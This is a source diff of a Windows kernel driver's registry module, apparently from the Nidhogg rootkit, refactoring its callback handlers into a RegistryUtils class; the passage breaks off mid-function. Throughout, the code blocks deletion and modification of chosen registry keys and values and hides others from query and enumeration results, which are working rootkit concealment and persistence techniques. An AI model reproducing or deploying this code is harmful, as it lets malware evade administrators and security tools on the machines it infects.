@@ -1,6 +1,45 @@
 #include "pch.h"
 #include "RegistryUtils.hpp"
 
+RegistryUtils::RegistryUtils() {
+	this->RegCookie = { 0 };
+
+	this->ProtectedItems.Keys.KeysCount = 0;
+	this->ProtectedItems.Values.ValuesCount = 0;
+	this->HiddenItems.Keys.KeysCount = 0;
+	this->HiddenItems.Values.ValuesCount = 0;
+
+	memset(this->HiddenItems.Keys.KeysPath, 0, sizeof(this->HiddenItems.Keys.KeysPath));
+	memset(this->HiddenItems.Values.ValuesPath, 0, sizeof(this->HiddenItems.Values.ValuesPath));
+	memset(this->HiddenItems.Values.ValuesName, 0, sizeof(this->HiddenItems.Values.ValuesName));
+
+
+	memset(this->ProtectedItems.Keys.KeysPath, 0, sizeof(this->ProtectedItems.Keys.KeysPath));
+	memset(this->ProtectedItems.Values.ValuesPath, 0, sizeof(this->HiddenItems.Values.ValuesPath));
+	memset(this->ProtectedItems.Values.ValuesName, 0, sizeof(this->HiddenItems.Values.ValuesName));
+
+	this->Lock.Init();
+}
+
+RegistryUtils::~RegistryUtils() {
+	AutoLock locker(this->Lock);
+
+	for (ULONG i = 0; i < this->ProtectedItems.Keys.KeysCount; i++) {
+		ExFreePoolWithTag(this->ProtectedItems.Keys.KeysPath[i], DRIVER_TAG);
+		this->ProtectedItems.Keys.KeysPath[i] = nullptr;
+	}
+	this->ProtectedItems.Keys.KeysCount = 0;
+
+	for (ULONG i = 0; i < this->ProtectedItems.Values.ValuesCount; i++) {
+		ExFreePoolWithTag(this->ProtectedItems.Values.ValuesPath[i], DRIVER_TAG);
+		ExFreePoolWithTag(this->ProtectedItems.Values.ValuesName[i], DRIVER_TAG);
+		this->ProtectedItems.Values.ValuesPath[i] = nullptr;
+		this->ProtectedItems.Values.ValuesName[i] = nullptr;
+	}
+	this->ProtectedItems.Values.ValuesCount = 0;
+}
+
+
 /*
 * Description:
 * OnRegistryNotify is responsible for handling registry operations and handle some of them.
@@ -19,28 +58,28 @@ NTSTATUS OnRegistryNotify(PVOID context, PVOID arg1, PVOID arg2) {
 
 	switch ((REG_NOTIFY_CLASS)(ULONG_PTR)arg1) {
 	case RegNtPreDeleteKey:
-		status = RegNtPreDeleteKeyHandler(static_cast<REG_DELETE_KEY_INFORMATION*>(arg2));
+		status = NidhoggRegistryUtils->RegNtPreDeleteKeyHandler(static_cast<REG_DELETE_KEY_INFORMATION*>(arg2));
 		break;
 	case RegNtPreDeleteValueKey:
-		status = RegNtPreDeleteValueKeyHandler(static_cast<REG_DELETE_VALUE_KEY_INFORMATION*>(arg2));
+		status = NidhoggRegistryUtils->RegNtPreDeleteValueKeyHandler(static_cast<REG_DELETE_VALUE_KEY_INFORMATION*>(arg2));
 		break;
 	case RegNtPreQueryKey:
-		status = RegNtPreQueryKeyHandler(static_cast<REG_QUERY_KEY_INFORMATION*>(arg2));
+		status = NidhoggRegistryUtils->RegNtPreQueryKeyHandler(static_cast<REG_QUERY_KEY_INFORMATION*>(arg2));
 		break;
 	case RegNtPreQueryValueKey:
-		status = RegNtPreQueryValueKeyHandler(static_cast<REG_QUERY_VALUE_KEY_INFORMATION*>(arg2));
+		status = NidhoggRegistryUtils->RegNtPreQueryValueKeyHandler(static_cast<REG_QUERY_VALUE_KEY_INFORMATION*>(arg2));
 		break;
 	case RegNtPreQueryMultipleValueKey:
-		status = RegNtPreQueryMultipleValueKeyHandler(static_cast<REG_QUERY_MULTIPLE_VALUE_KEY_INFORMATION*>(arg2));
+		status = NidhoggRegistryUtils->RegNtPreQueryMultipleValueKeyHandler(static_cast<REG_QUERY_MULTIPLE_VALUE_KEY_INFORMATION*>(arg2));
 		break;
 	case RegNtPreSetValueKey:
-		status = RegNtPreSetValueKeyHandler(static_cast<REG_SET_VALUE_KEY_INFORMATION*>(arg2));
+		status = NidhoggRegistryUtils->RegNtPreSetValueKeyHandler(static_cast<REG_SET_VALUE_KEY_INFORMATION*>(arg2));
 		break;
 	case RegNtPostEnumerateKey:
-		status = RegNtPostEnumerateKeyHandler(static_cast<REG_POST_OPERATION_INFORMATION*>(arg2));
+		status = NidhoggRegistryUtils->RegNtPostEnumerateKeyHandler(static_cast<REG_POST_OPERATION_INFORMATION*>(arg2));
 		break;
 	case RegNtPostEnumerateValueKey:
-		status = RegNtPostEnumerateValueKeyHandler(static_cast<REG_POST_OPERATION_INFORMATION*>(arg2));
+		status = NidhoggRegistryUtils->RegNtPostEnumerateValueKeyHandler(static_cast<REG_POST_OPERATION_INFORMATION*>(arg2));
 		break;
 	}
 
@@ -57,7 +96,7 @@ NTSTATUS OnRegistryNotify(PVOID context, PVOID arg1, PVOID arg2) {
 * Returns:
 * @status [NTSTATUS]					-- Whether the operation was successful or not.
 */
-NTSTATUS RegNtPreDeleteKeyHandler(REG_DELETE_KEY_INFORMATION* info) {
+NTSTATUS RegistryUtils::RegNtPreDeleteKeyHandler(REG_DELETE_KEY_INFORMATION* info) {
 	RegItem regItem{};
 	PCUNICODE_STRING regPath;
 	NTSTATUS status = STATUS_SUCCESS;
@@ -66,7 +105,7 @@ NTSTATUS RegNtPreDeleteKeyHandler(REG_DELETE_KEY_INFORMATION* info) {
 	if (!info->Object || !VALID_KERNELMODE_MEMORY((DWORD64)info->Object))
 		return STATUS_SUCCESS;
 
-	status = CmCallbackGetKeyObjectIDEx(&rGlobals.RegCookie, info->Object, nullptr, &regPath, 0);
+	status = CmCallbackGetKeyObjectIDEx(&this->RegCookie, info->Object, nullptr, &regPath, 0);
 
 	if (!NT_SUCCESS(status)) {
 		return STATUS_SUCCESS;
@@ -77,9 +116,9 @@ NTSTATUS RegNtPreDeleteKeyHandler(REG_DELETE_KEY_INFORMATION* info) {
 	}
 
 	wcsncpy_s(regItem.KeyPath, regPath->Buffer, regPath->Length / sizeof(WCHAR));
-	regItem.Type = REG_TYPE_PROTECTED_KEY;
+	regItem.Type = RegProtectedKey;
 
-	if (FindRegItem(regItem)) {
+	if (FindRegItem(&regItem)) {
 		auto prevIrql = KeGetCurrentIrql();
 		KeLowerIrql(PASSIVE_LEVEL);
 		KdPrint((DRIVER_PREFIX "Protected key %ws\n", regItem.KeyPath));
@@ -101,7 +140,7 @@ NTSTATUS RegNtPreDeleteKeyHandler(REG_DELETE_KEY_INFORMATION* info) {
 * Returns:
 * @status [NTSTATUS]						  -- Whether the operation was successful or not.
 */
-NTSTATUS RegNtPreDeleteValueKeyHandler(REG_DELETE_VALUE_KEY_INFORMATION* info) {
+NTSTATUS RegistryUtils::RegNtPreDeleteValueKeyHandler(REG_DELETE_VALUE_KEY_INFORMATION* info) {
 	RegItem regItem{};
 	PCUNICODE_STRING regPath;
 	NTSTATUS status = STATUS_SUCCESS;
@@ -110,7 +149,7 @@ NTSTATUS RegNtPreDeleteValueKeyHandler(REG_DELETE_VALUE_KEY_INFORMATION* info) {
 	if (!VALID_KERNELMODE_MEMORY((DWORD64)info->Object))
 		return STATUS_SUCCESS;
 
-	status = CmCallbackGetKeyObjectIDEx(&rGlobals.RegCookie, info->Object, nullptr, &regPath, 0);
+	status = CmCallbackGetKeyObjectIDEx(&this->RegCookie, info->Object, nullptr, &regPath, 0);
 
 	if (!NT_SUCCESS(status)) {
 		return STATUS_SUCCESS;
@@ -122,9 +161,9 @@ NTSTATUS RegNtPreDeleteValueKeyHandler(REG_DELETE_VALUE_KEY_INFORMATION* info) {
 
 	wcsncpy_s(regItem.KeyPath, regPath->Buffer, regPath->Length / sizeof(WCHAR));
 	wcsncpy_s(regItem.ValueName, info->ValueName->Buffer, info->ValueName->Length / sizeof(WCHAR));
-	regItem.Type = REG_TYPE_PROTECTED_VALUE;
+	regItem.Type = RegProtectedValue;
 
-	if (FindRegItem(regItem)) {
+	if (FindRegItem(&regItem)) {
 		auto prevIrql = KeGetCurrentIrql();
 		KeLowerIrql(PASSIVE_LEVEL);
 		KdPrint((DRIVER_PREFIX "Protected value %ws\\%ws\n", regItem.KeyPath, regItem.ValueName));
@@ -146,7 +185,7 @@ NTSTATUS RegNtPreDeleteValueKeyHandler(REG_DELETE_VALUE_KEY_INFORMATION* info) {
 * Returns:
 * @status [NTSTATUS]				   -- Whether the operation was successful or not.
 */
-NTSTATUS RegNtPreQueryKeyHandler(REG_QUERY_KEY_INFORMATION* info) {
+NTSTATUS RegistryUtils::RegNtPreQueryKeyHandler(REG_QUERY_KEY_INFORMATION* info) {
 	RegItem regItem{};
 	PCUNICODE_STRING regPath;
 	NTSTATUS status = STATUS_SUCCESS;
@@ -155,7 +194,7 @@ NTSTATUS RegNtPreQueryKeyHandler(REG_QUERY_KEY_INFORMATION* info) {
 	if (!info->Object || !VALID_KERNELMODE_MEMORY((DWORD64)info->Object))
 		return STATUS_SUCCESS;
 
-	status = CmCallbackGetKeyObjectIDEx(&rGlobals.RegCookie, info->Object, nullptr, &regPath, 0);
+	status = CmCallbackGetKeyObjectIDEx(&this->RegCookie, info->Object, nullptr, &regPath, 0);
 
 	if (!NT_SUCCESS(status)) {
 		return STATUS_SUCCESS;
@@ -166,9 +205,9 @@ NTSTATUS RegNtPreQueryKeyHandler(REG_QUERY_KEY_INFORMATION* info) {
 	}
 
 	wcsncpy_s(regItem.KeyPath, regPath->Buffer, regPath->Length / sizeof(WCHAR));
-	regItem.Type = REG_TYPE_HIDDEN_KEY;
+	regItem.Type = RegHiddenKey;
 
-	if (FindRegItem(regItem)) {
+	if (FindRegItem(&regItem)) {
 		auto prevIrql = KeGetCurrentIrql();
 		KeLowerIrql(PASSIVE_LEVEL);
 		KdPrint((DRIVER_PREFIX "Hid key from query %ws\n", regItem.KeyPath));
@@ -190,7 +229,7 @@ NTSTATUS RegNtPreQueryKeyHandler(REG_QUERY_KEY_INFORMATION* info) {
 * Returns:
 * @status [NTSTATUS]						 -- Whether the operation was successful or not.
 */
-NTSTATUS RegNtPreQueryValueKeyHandler(REG_QUERY_VALUE_KEY_INFORMATION* info) {
+NTSTATUS RegistryUtils::RegNtPreQueryValueKeyHandler(REG_QUERY_VALUE_KEY_INFORMATION* info) {
 	RegItem regItem{};
 	PCUNICODE_STRING regPath;
 	NTSTATUS status = STATUS_SUCCESS;
@@ -199,7 +238,7 @@ NTSTATUS RegNtPreQueryValueKeyHandler(REG_QUERY_VALUE_KEY_INFORMATION* info) {
 	if (!VALID_KERNELMODE_MEMORY((DWORD64)info->Object))
 		return STATUS_SUCCESS;
 
-	status = CmCallbackGetKeyObjectIDEx(&rGlobals.RegCookie, info->Object, nullptr, &regPath, 0);
+	status = CmCallbackGetKeyObjectIDEx(&this->RegCookie, info->Object, nullptr, &regPath, 0);
 
 	if (!NT_SUCCESS(status)) {
 		return STATUS_SUCCESS;
@@ -211,9 +250,9 @@ NTSTATUS RegNtPreQueryValueKeyHandler(REG_QUERY_VALUE_KEY_INFORMATION* info) {
 
 	wcsncpy_s(regItem.KeyPath, regPath->Buffer, regPath->Length / sizeof(WCHAR));
 	wcsncpy_s(regItem.ValueName, info->ValueName->Buffer, info->ValueName->Length / sizeof(WCHAR));
-	regItem.Type = REG_TYPE_HIDDEN_VALUE;
+	regItem.Type = RegHiddenValue;
 
-	if (FindRegItem(regItem)) {
+	if (FindRegItem(&regItem)) {
 		auto prevIrql = KeGetCurrentIrql();
 		KeLowerIrql(PASSIVE_LEVEL);
 		KdPrint((DRIVER_PREFIX "Hid value from query %ws\\%ws\n", regItem.KeyPath, regItem.ValueName));
@@ -235,7 +274,7 @@ NTSTATUS RegNtPreQueryValueKeyHandler(REG_QUERY_VALUE_KEY_INFORMATION* info) {
 * Returns:
 * @status [NTSTATUS]								  -- Whether the operation was successful or not.
 */
-NTSTATUS RegNtPreQueryMultipleValueKeyHandler(REG_QUERY_MULTIPLE_VALUE_KEY_INFORMATION* info) {
+NTSTATUS RegistryUtils::RegNtPreQueryMultipleValueKeyHandler(REG_QUERY_MULTIPLE_VALUE_KEY_INFORMATION* info) {
 	RegItem regItem{};
 	PCUNICODE_STRING regPath;
 	NTSTATUS status = STATUS_SUCCESS;
@@ -244,7 +283,7 @@ NTSTATUS RegNtPreQueryMultipleValueKeyHandler(REG_QUERY_MULTIPLE_VALUE_KEY_INFOR
 	if (!VALID_KERNELMODE_MEMORY((DWORD64)info->Object))
 		return STATUS_SUCCESS;
 
-	status = CmCallbackGetKeyObjectIDEx(&rGlobals.RegCookie, info->Object, nullptr, &regPath, 0);
+	status = CmCallbackGetKeyObjectIDEx(&this->RegCookie, info->Object, nullptr, &regPath, 0);
 
 	if (!NT_SUCCESS(status)) {
 		return STATUS_SUCCESS;
@@ -254,13 +293,13 @@ NTSTATUS RegNtPreQueryMultipleValueKeyHandler(REG_QUERY_MULTIPLE_VALUE_KEY_INFOR
 		return STATUS_SUCCESS;
 	}
 
-	regItem.Type = REG_TYPE_HIDDEN_VALUE;
+	regItem.Type = RegHiddenValue;
 	wcsncpy_s(regItem.KeyPath, regPath->Buffer, regPath->Length / sizeof(WCHAR));
 
 	for (ULONG index = 0; index < info->EntryCount; index++) {
 		wcsncpy_s(regItem.ValueName, info->ValueEntries[index].ValueName->Buffer, info->ValueEntries[index].ValueName->Length / sizeof(WCHAR));
 
-		if (FindRegItem(regItem)) {
+		if (FindRegItem(&regItem)) {
 			auto prevIrql = KeGetCurrentIrql();
 			KeLowerIrql(PASSIVE_LEVEL);
 			KdPrint((DRIVER_PREFIX "Hid value from multiple query %ws\\%ws\n", regItem.KeyPath, regItem.ValueName));
@@ -286,7 +325,7 @@ NTSTATUS RegNtPreQueryMultipleValueKeyHandler(REG_QUERY_MULTIPLE_VALUE_KEY_INFOR
 * Returns:
 * @status [NTSTATUS]					   -- Whether the operation was successful or not.
 */
-NTSTATUS RegNtPreSetValueKeyHandler(REG_SET_VALUE_KEY_INFORMATION* info) {
+NTSTATUS RegistryUtils::RegNtPreSetValueKeyHandler(REG_SET_VALUE_KEY_INFORMATION* info) {
 	RegItem regItem{};
 	PCUNICODE_STRING regPath;
 	NTSTATUS status = STATUS_SUCCESS;
@@ -295,7 +334,7 @@ NTSTATUS RegNtPreSetValueKeyHandler(REG_SET_VALUE_KEY_INFORMATION* info) {
 	if (!VALID_KERNELMODE_MEMORY((DWORD64)info->Object))
 		return STATUS_SUCCESS;
 
-	status = CmCallbackGetKeyObjectIDEx(&rGlobals.RegCookie, info->Object, nullptr, &regPath, 0);
+	status = CmCallbackGetKeyObjectIDEx(&this->RegCookie, info->Object, nullptr, &regPath, 0);
 
 	if (!NT_SUCCESS(status)) {
 		return STATUS_SUCCESS;
@@ -307,9 +346,9 @@ NTSTATUS RegNtPreSetValueKeyHandler(REG_SET_VALUE_KEY_INFORMATION* info) {
 
 	wcsncpy_s(regItem.KeyPath, regPath->Buffer, regPath->Length / sizeof(WCHAR));
 	wcsncpy_s(regItem.ValueName, info->ValueName->Buffer, info->ValueName->Length / sizeof(WCHAR));
-	regItem.Type = REG_TYPE_PROTECTED_VALUE;
+	regItem.Type = RegProtectedValue;
 
-	if (FindRegItem(regItem)) {
+	if (FindRegItem(&regItem)) {
 		auto prevIrql = KeGetCurrentIrql();
 		KeLowerIrql(PASSIVE_LEVEL);
 		KdPrint((DRIVER_PREFIX "Blocked setting value %ws\\%ws\n", regItem.KeyPath, regItem.ValueName));
@@ -331,7 +370,7 @@ NTSTATUS RegNtPreSetValueKeyHandler(REG_SET_VALUE_KEY_INFORMATION* info) {
 * Returns:
 * @status [NTSTATUS]					    -- Whether the operation was successful or not.
 */
-NTSTATUS RegNtPostEnumerateKeyHandler(REG_POST_OPERATION_INFORMATION* info) {
+NTSTATUS RegistryUtils::RegNtPostEnumerateKeyHandler(REG_POST_OPERATION_INFORMATION* info) {
 	HANDLE key;
 	PVOID tempKeyInformation;
 	REG_ENUMERATE_KEY_INFORMATION* preInfo;
@@ -341,20 +380,20 @@ NTSTATUS RegNtPostEnumerateKeyHandler(REG_POST_OPERATION_INFORMATION* info) {
 	UNICODE_STRING keyName;
 	int counter = 0;
 	NTSTATUS status = STATUS_SUCCESS;
-	bool copyKeyInformationData = true;
+	bool copyKeyInformationitem = true;
 
 	if (!NT_SUCCESS(info->Status)) {
 		return STATUS_SUCCESS;
 	}
 
-	AutoLock locker(rGlobals.Lock);
-	status = CmCallbackGetKeyObjectIDEx(&rGlobals.RegCookie, info->Object, nullptr, &regPath, 0);
+	AutoLock locker(this->Lock);
+	status = CmCallbackGetKeyObjectIDEx(&this->RegCookie, info->Object, nullptr, &regPath, 0);
 
 	if (!NT_SUCCESS(status))
 		return STATUS_SUCCESS;
 
 	// Checking if the registry key contains any protected registry key.
-	if (!ContainsProtectedRegKey(*regPath, REG_TYPE_HIDDEN_KEY)) {
+	if (!ContainsProtectedRegKey(*regPath, RegHiddenKey)) {
 		CmCallbackReleaseKeyObjectIDEx(regPath);
 		return STATUS_SUCCESS;
 	}
@@ -379,20 +418,20 @@ NTSTATUS RegNtPostEnumerateKeyHandler(REG_POST_OPERATION_INFORMATION* info) {
 	tempKeyInformation = (LPWSTR)ExAllocatePoolWithTag(PagedPool, preInfo->Length, DRIVER_TAG);
 
 	if (tempKeyInformation) {
-		item.Type = REG_TYPE_HIDDEN_KEY;
+		item.Type = RegHiddenKey;
 		wcsncpy_s(item.KeyPath, regPath->Buffer, regPath->Length / sizeof(WCHAR));
 
 		// To address the situtation of finding several protected keys, need to do a while until found an unprotected key.
-		while (copyKeyInformationData) {
+		while (copyKeyInformationitem) {
 			status = ZwEnumerateKey(key, preInfo->Index + counter, preInfo->KeyInformationClass, tempKeyInformation, preInfo->Length, &resultLength);
 
 			if (!NT_SUCCESS(status)) {
-				copyKeyInformationData = false;
+				copyKeyInformationitem = false;
 				continue;
 			}
 
 			if (!GetNameFromKeyEnumPreInfo(preInfo->KeyInformationClass, tempKeyInformation, &keyName)) {
-				copyKeyInformationData = false;
+				copyKeyInformationitem = false;
 				continue;
 			}
 			keyName.Buffer[keyName.MaximumLength / sizeof(WCHAR)] = L'\0';
@@ -401,17 +440,17 @@ NTSTATUS RegNtPostEnumerateKeyHandler(REG_POST_OPERATION_INFORMATION* info) {
 			wcscat_s(item.KeyPath, L"\\");
 			wcscat_s(item.KeyPath, keyName.Buffer);
 
-			if (!FindRegItem(item)) {
+			if (!FindRegItem(&item)) {
 				*preInfo->ResultLength = resultLength;
 
 				__try {
 					RtlCopyMemory(preInfo->KeyInformation, tempKeyInformation, resultLength);
 				}
 				__except (EXCEPTION_EXECUTE_HANDLER) {
-					KdPrint((DRIVER_PREFIX "Failed to copy the next key data, 0x%x\n", GetExceptionCode()));
+					KdPrint((DRIVER_PREFIX "Failed to copy the next key item, 0x%x\n", GetExceptionCode()));
 				}
 
-				copyKeyInformationData = false;
+				copyKeyInformationitem = false;
 			}
 			else {
 				counter++;
@@ -421,7 +460,7 @@ NTSTATUS RegNtPostEnumerateKeyHandler(REG_POST_OPERATION_INFORMATION* info) {
 				KeRaiseIrql(prevIrql, &prevIrql);
 			}
 
-			// To avoid concatenating bad data.
+			// To avoid concatenating bad item.
 			item.KeyPath[0] = L'\0';
 			wcsncpy_s(item.KeyPath, regPath->Buffer, regPath->Length / sizeof(WCHAR));
 		}
@@ -448,7 +487,7 @@ NTSTATUS RegNtPostEnumerateKeyHandler(REG_POST_OPERATION_INFORMATION* info) {
 * Returns:
 * @status [NTSTATUS]					    -- Whether the operation was successful or not.
 */
-NTSTATUS RegNtPostEnumerateValueKeyHandler(REG_POST_OPERATION_INFORMATION* info) {
+NTSTATUS RegistryUtils::RegNtPostEnumerateValueKeyHandler(REG_POST_OPERATION_INFORMATION* info) {
 	HANDLE key;
 	PVOID tempValueInformation;
 	REG_ENUMERATE_VALUE_KEY_INFORMATION* preInfo;
@@ -457,21 +496,21 @@ NTSTATUS RegNtPostEnumerateValueKeyHandler(REG_POST_OPERATION_INFORMATION* info)
 	ULONG resultLength;
 	RegItem item{};
 	NTSTATUS status = STATUS_SUCCESS;
-	bool copyKeyInformationData = true;
+	bool copyKeyInformationitem = true;
 	int counter = 0;
 
 	if (!NT_SUCCESS(info->Status)) {
 		return STATUS_SUCCESS;
 	}
 
-	AutoLock locker(rGlobals.Lock);
-	status = CmCallbackGetKeyObjectIDEx(&rGlobals.RegCookie, info->Object, nullptr, &regPath, 0);
+	AutoLock locker(this->Lock);
+	status = CmCallbackGetKeyObjectIDEx(&this->RegCookie, info->Object, nullptr, &regPath, 0);
 
 	if (!NT_SUCCESS(status))
 		return STATUS_SUCCESS;
 
 	// Checking if the registry key contains any protected registry value.
-	if (!ContainsProtectedRegKey(*regPath, REG_TYPE_HIDDEN_VALUE)) {
+	if (!ContainsProtectedRegKey(*regPath, RegHiddenValue)) {
 		CmCallbackReleaseKeyObjectIDEx(regPath);
 		return STATUS_SUCCESS;
 	}
@@ -495,26 +534,26 @@ NTSTATUS RegNtPostEnumerateValueKeyHandler(REG_POST_OPERATION_INFORMATION* info)
 	tempValueInformation = (PVOID)ExAllocatePoolWithTag(PagedPool, preInfo->Length, DRIVER_TAG);
 
 	if (tempValueInformation) {
-		item.Type = REG_TYPE_HIDDEN_VALUE;
+		item.Type = RegHiddenValue;
 		wcsncpy_s(item.KeyPath, regPath->Buffer, regPath->Length / sizeof(WCHAR));
 
 		// To address the situtation of finding several protected keys, need to do a while until found an unprotected key.
-		while (copyKeyInformationData) {
+		while (copyKeyInformationitem) {
 			status = ZwEnumerateValueKey(key, preInfo->Index + counter, preInfo->KeyValueInformationClass, tempValueInformation, preInfo->Length, &resultLength);
 
 			if (!NT_SUCCESS(status)) {
-				copyKeyInformationData = false;
+				copyKeyInformationitem = false;
 				continue;
 			}
 
 			if (!GetNameFromValueEnumPreInfo(preInfo->KeyValueInformationClass, preInfo->KeyValueInformation, &valueName)) {
-				copyKeyInformationData = false;
+				copyKeyInformationitem = false;
 			}
 			valueName.Buffer[valueName.Length / sizeof(WCHAR)] = L'\0';
 			item.ValueName[0] = L'\0';
 			wcsncpy_s(item.ValueName, valueName.Buffer, valueName.Length / sizeof(WCHAR));
 
-			if (!FindRegItem(item)) {
+			if (!FindRegItem(&item)) {
 				*preInfo->ResultLength = resultLength;
 
 				// Adding the try & except to be sure, copying memory shouldn't cause a problem.
@@ -522,10 +561,10 @@ NTSTATUS RegNtPostEnumerateValueKeyHandler(REG_POST_OPERATION_INFORMATION* info)
 					RtlCopyMemory(preInfo->KeyValueInformation, tempValueInformation, resultLength);
 				}
 				__except (EXCEPTION_EXECUTE_HANDLER) {
-					KdPrint((DRIVER_PREFIX "Failed to copy the next value data, 0x%x\n", GetExceptionCode()));
+					KdPrint((DRIVER_PREFIX "Failed to copy the next value item, 0x%x\n", GetExceptionCode()));
 				}
 
-				copyKeyInformationData = false;
+				copyKeyInformationitem = false;
 				continue;
 			}
 			else {
@@ -561,7 +600,7 @@ NTSTATUS RegNtPostEnumerateValueKeyHandler(REG_POST_OPERATION_INFORMATION* info)
 * Returns:
 * @status	   [bool]						 -- Whether the operation was successful or not.
 */
-bool GetNameFromValueEnumPreInfo(KEY_VALUE_INFORMATION_CLASS infoClass, PVOID information, PUNICODE_STRING valueName) {
+bool RegistryUtils::GetNameFromValueEnumPreInfo(KEY_VALUE_INFORMATION_CLASS infoClass, PVOID information, PUNICODE_STRING valueName) {
 	switch (infoClass) {
 	case KeyValueBasicInformation:
 	{
@@ -598,7 +637,7 @@ bool GetNameFromValueEnumPreInfo(KEY_VALUE_INFORMATION_CLASS infoClass, PVOID in
 * Returns:
 * @status	   [bool]						 -- Whether the operation was successful or not.
 */
-bool GetNameFromKeyEnumPreInfo(KEY_INFORMATION_CLASS infoClass, PVOID information, PUNICODE_STRING keyName) {
+bool RegistryUtils::GetNameFromKeyEnumPreInfo(KEY_INFORMATION_CLASS infoClass, PVOID information, PUNICODE_STRING keyName) {
 	switch (infoClass) {
 	case KeyBasicInformation:
 	{
@@ -636,32 +675,32 @@ bool GetNameFromKeyEnumPreInfo(KEY_INFORMATION_CLASS infoClass, PVOID informatio
 * FindRegItem is responsible for searching if a registry item exists in any of the registry items lists.
 *
 * Parameters:
-* @item	  [RegItem&] -- Registry item to search.
+* @item	  [RegItem*] -- Registry item to search.
 *
 * Returns:
 * @status [bool]	 -- Whether found or not.
 */
-bool FindRegItem(RegItem& item) {
-	if (item.Type == REG_TYPE_PROTECTED_KEY) {
-		for (int i = 0; i < rGlobals.ProtectedItems.Keys.KeysCount; i++)
-			if (_wcsnicmp(rGlobals.ProtectedItems.Keys.KeysPath[i], item.KeyPath, wcslen(rGlobals.ProtectedItems.Keys.KeysPath[i])) == 0)
+bool RegistryUtils::FindRegItem(RegItem* item) {
+	if (item->Type == RegProtectedKey) {
+		for (ULONG i = 0; i < this->ProtectedItems.Keys.KeysCount; i++)
+			if (_wcsnicmp(this->ProtectedItems.Keys.KeysPath[i], item->KeyPath, wcslen(this->ProtectedItems.Keys.KeysPath[i])) == 0)
 				return true;
 	}
-	else if (item.Type == REG_TYPE_HIDDEN_KEY) {
-		for (int i = 0; i < rGlobals.HiddenItems.Keys.KeysCount; i++)
-			if (_wcsnicmp(rGlobals.HiddenItems.Keys.KeysPath[i], item.KeyPath, wcslen(rGlobals.HiddenItems.Keys.KeysPath[i])) == 0)
+	else if (item->Type == RegHiddenKey) {
+		for (ULONG i = 0; i < this->HiddenItems.Keys.KeysCount; i++)
+			if (_wcsnicmp(this->HiddenItems.Keys.KeysPath[i], item->KeyPath, wcslen(this->HiddenItems.Keys.KeysPath[i])) == 0)
 				return true;
 	}
-	else if (item.Type == REG_TYPE_PROTECTED_VALUE) {
-		for (int i = 0; i < rGlobals.ProtectedItems.Values.ValuesCount; i++)
-			if (_wcsnicmp(rGlobals.ProtectedItems.Values.ValuesPath[i], item.KeyPath, wcslen(rGlobals.ProtectedItems.Values.ValuesPath[i])) == 0 &&
-				_wcsnicmp(rGlobals.ProtectedItems.Values.ValuesName[i], item.ValueName, wcslen(rGlobals.ProtectedItems.Values.ValuesName[i])) == 0)
+	else if (item->Type == RegProtectedValue) {
+		for (ULONG i = 0; i < this->ProtectedItems.Values.ValuesCount; i++)
+			if (_wcsnicmp(this->ProtectedItems.Values.ValuesPath[i], item->KeyPath, wcslen(this->ProtectedItems.Values.ValuesPath[i])) == 0 &&
+				_wcsnicmp(this->ProtectedItems.Values.ValuesName[i], item->ValueName, wcslen(this->ProtectedItems.Values.ValuesName[i])) == 0)
 				return true;
 	}
-	else if (item.Type == REG_TYPE_HIDDEN_VALUE) {
-		for (int i = 0; i < rGlobals.HiddenItems.Values.ValuesCount; i++)
-			if (_wcsnicmp(rGlobals.HiddenItems.Values.ValuesPath[i], item.KeyPath, wcslen(rGlobals.HiddenItems.Values.ValuesPath[i])) == 0 &&
-				_wcsnicmp(rGlobals.HiddenItems.Values.ValuesName[i], item.ValueName, wcslen(rGlobals.HiddenItems.Values.ValuesName[i])) == 0)
+	else if (item->Type == RegHiddenValue) {
+		for (ULONG i = 0; i < this->HiddenItems.Values.ValuesCount; i++)
+			if (_wcsnicmp(this->HiddenItems.Values.ValuesPath[i], item->KeyPath, wcslen(this->HiddenItems.Values.ValuesPath[i])) == 0 &&
+				_wcsnicmp(this->HiddenItems.Values.ValuesName[i], item->ValueName, wcslen(this->HiddenItems.Values.ValuesName[i])) == 0)
 				return true;
 	}
 
@@ -674,33 +713,33 @@ bool FindRegItem(RegItem& item) {
 *
 * Parameters:
 * @regKey [UNICODE_STRING] -- Registry item to search.
-* @type	  [int]			   -- Type of the registry item.
+* @type	  [RegItemType]	   -- Type of the registry item.
 *
 * Returns:
 * @status [bool]		   -- Whether found or not.
 */
-bool ContainsProtectedRegKey(UNICODE_STRING regKey, int type) {
-	if (type == REG_TYPE_PROTECTED_KEY) {
-		for (int i = 0; i < rGlobals.ProtectedItems.Keys.KeysCount; i++) {
-			if ((regKey.Length / sizeof(WCHAR)) <= wcslen(rGlobals.ProtectedItems.Keys.KeysPath[i]) && _wcsnicmp(rGlobals.ProtectedItems.Keys.KeysPath[i], regKey.Buffer, regKey.Length / sizeof(WCHAR)) == 0)
+bool RegistryUtils::ContainsProtectedRegKey(UNICODE_STRING regKey, RegItemType type) {
+	if (type == RegProtectedKey) {
+		for (ULONG i = 0; i < this->ProtectedItems.Keys.KeysCount; i++) {
+			if ((regKey.Length / sizeof(WCHAR)) <= wcslen(this->ProtectedItems.Keys.KeysPath[i]) && _wcsnicmp(this->ProtectedItems.Keys.KeysPath[i], regKey.Buffer, regKey.Length / sizeof(WCHAR)) == 0)
 				return true;
 		}
 	}
-	else if (type == REG_TYPE_HIDDEN_KEY) {
-		for (int i = 0; i < rGlobals.HiddenItems.Keys.KeysCount; i++) {
-			if ((regKey.Length / sizeof(WCHAR)) <= wcslen(rGlobals.HiddenItems.Keys.KeysPath[i]) && _wcsnicmp(rGlobals.HiddenItems.Keys.KeysPath[i], regKey.Buffer, regKey.Length / sizeof(WCHAR)) == 0)
+	else if (type == RegHiddenKey) {
+		for (ULONG i = 0; i < this->HiddenItems.Keys.KeysCount; i++) {
+			if ((regKey.Length / sizeof(WCHAR)) <= wcslen(this->HiddenItems.Keys.KeysPath[i]) && _wcsnicmp(this->HiddenItems.Keys.KeysPath[i], regKey.Buffer, regKey.Length / sizeof(WCHAR)) == 0)
 				return true;
 		}
 	}
-	else if (type == REG_TYPE_PROTECTED_VALUE) {
-		for (int i = 0; i < rGlobals.ProtectedItems.Values.ValuesCount; i++) {
-			if ((regKey.Length / sizeof(WCHAR)) <= wcslen(rGlobals.ProtectedItems.Values.ValuesPath[i]) && _wcsnicmp(rGlobals.ProtectedItems.Values.ValuesPath[i], regKey.Buffer, regKey.Length / sizeof(WCHAR)) == 0)
+	else if (type == RegProtectedValue) {
+		for (ULONG i = 0; i < this->ProtectedItems.Values.ValuesCount; i++) {
